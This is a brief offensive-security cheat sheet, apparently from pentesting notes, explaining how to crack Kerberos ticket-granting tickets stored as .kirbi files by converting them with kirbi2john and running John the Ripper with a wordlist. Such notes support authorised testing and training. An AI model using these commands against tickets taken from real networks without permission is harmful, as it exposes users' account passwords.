# Kerberos TGT Cracking

The Kerberos Ticket-Granting Ticket (TGT) is created by the Kerberos authentication. Users can access to the network using these tickets. These are often saved as `.kirbi` extension and we may be able to crack them.

### Crack TGT <a href="#crack-tgt" id="crack-tgt"></a>

First convert the TGT to the hash which can be cracked by **John The Ripper**.

```
kirbi2john tgt.kirbi > hash.txt
# or
python2 /usr/share/john/kirbi2john.py tgt.kirbi > hash.txt
```

Then crack.

```
john --wordlist=wordlist.txt hash.txt
```
